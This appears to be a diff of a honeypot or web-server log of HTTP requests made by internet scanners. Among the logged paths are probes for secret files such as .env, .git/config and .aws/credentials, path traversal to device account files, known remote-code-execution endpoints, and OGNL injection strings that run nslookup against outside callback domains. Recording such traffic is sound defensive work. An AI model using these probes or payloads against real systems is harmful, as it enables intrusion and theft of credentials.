@@ -43,15 +43,17 @@ User-Agent Go-http-client/1.1
 
 
 method GET url /
-method GET url /.env
 method GET url /0YZy
 method GET url /99vt
 method GET url /99vu
+method GET url /9drM
 method GET url /aaa9
 method GET url /aab8
+method GET url /aab9
+method GET url /GWqN
+method GET url /OoSL
 method GET url /qARY
 method GET url /xz19
-method GET url /GWqN
 method GET url /login
 method GET url /admin/
 method GET url /HNAP1/
@@ -83,6 +85,7 @@ method GET url /symfony/public/_profiler/phpinfo
 method GET url /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php
 method GET url stager
 method GET url stager64
+method GET url /?pp=env
 method GET url /.env
 method GET url /.env.old
 method GET url /.env.dist
@@ -121,6 +124,8 @@ method GET url /.git/HEAD
 method GET url /.git/config
 method GET url /PSIA/index
 method GET url /config.json
+method GET url /.aws/config
+method GET url /.aws/credentials
 method GET url /__Additional
 method GET url /cgi/conf.bin
 method GET url /cgi-bin/luci
@@ -136,6 +141,7 @@ method GET url /Portal/Portal.mwsl
 method GET url /actuator/health
 method GET url /CSS/Miniweb.css
 method GET url /telescope/requests
+method GET url /docker-compose.yml
 method GET url /00_server_info.php
 method GET url /_info-backoffice.php
 method GET url /api/session/properties
@@ -143,10 +149,13 @@ method GET url /actuator/gateway/routes
 method GET url /.well-known/security.txt
 method GET url /nmaplowercheck1705222954
 method GET url /pfblockerng/www/index.php
+method GET url /app/config/parameters.yml
 method GET url /_ignition/execute-solution
 method GET url /aaaaaaaaaaaaaaaaaaaaaaaaaqr
 method GET url /app?service=page/PrinterList
 method GET url /app?service=page/SetupCompleted
+method GET url /../../mnt/mtd/Config/Account1
+method GET url /../../mnt/mtd/Config/Account2
 method GET url /?XDEBUG_SESSION_START=phpstorm
 method GET url /nice%20ports%2C/Tri%6Eity.txt%2ebak
 method GET url /Telerik.Web.UI.WebResource.axd?type=rau
@@ -160,6 +169,7 @@ method GET url /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 method GET url http://www.google.com
 method GET url http://5.188.210.227/echo.php
 method GET url http://api.ipify.org/?format=json
+method GET url http://141.98.7.179/a.php?pro=<ip_address>:8080
 method GET url http://45.14.244.249/a.php?pro=<ip_address>:8080
 method GET url http://<ip_address>:8080/pma/scripts/setup.php
 method GET url http://<ip_address>:8080/myadmin/scripts/setup.php
@@ -178,6 +188,8 @@ method GET url http://<ip_address>:8080/phpMyAdmin-2.11.4/scripts/setup.php
 method GET url http://<ip_address>:8080/phpMyAdmin-2.11.7/scripts/setup.php
 method GET url http://<ip_address>:8080/phpMyAdmin-2.11.9.2/scripts/setup.php
 method GET url /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cm65lhb332t11umgfcmgezufjihurspg3.oast.fun%22%29%7D/
+method GET url /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cmp9f2b332t1tgj4mbtggcww5t8zhaoua.oast.site%22%29%7D/
+method GET url /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20cmp9f2b332t1tgj4mbtg4yc77p8seuucb.oast.site%22%29%7D/
 method PRI url *
 method POST url /
 method POST url /app
@@ -215,6 +227,7 @@ method POST url /shared/.env%20
 method POST url /laravel/.env%20
 method POST url /admin-app/.env%20
 method POST url /development/.env%20
+method POST url /rpcform/login
 method POST url /mgmt/tm/util/bash
 method POST url /scripts/WPnBr.dll
 method POST url /onvif/device_service
